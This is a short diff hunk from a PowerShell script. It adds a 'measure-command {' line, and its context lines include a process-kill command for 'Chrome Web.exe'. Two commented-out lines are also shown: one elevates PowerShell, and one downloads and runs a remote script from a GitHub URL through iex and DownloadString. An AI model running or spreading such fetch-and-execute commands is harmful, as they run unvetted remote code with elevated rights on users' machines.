@@ -3,6 +3,7 @@
 #powershell "start-process powershell -verb runas"
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/asar.ps1')"
 
+measure-command {
 
 Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
 
